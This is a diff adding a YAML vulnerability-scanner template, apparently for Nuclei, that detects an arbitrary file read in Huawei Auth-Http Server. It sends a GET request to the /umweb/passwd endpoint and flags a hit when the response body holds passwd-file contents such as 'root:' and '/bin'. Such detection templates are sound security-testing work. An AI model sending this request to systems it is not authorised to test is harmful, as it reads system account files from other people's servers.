@@ -1,0 +1,27 @@
+id: poc-yaml-huawei-auth-http-server-anyfile-read
+info:
+  name: Huawei Auth-Http Server Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Detects arbitrary file read vulnerability in Huawei Auth-Http Server through the /umweb/passwd endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/umweb/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
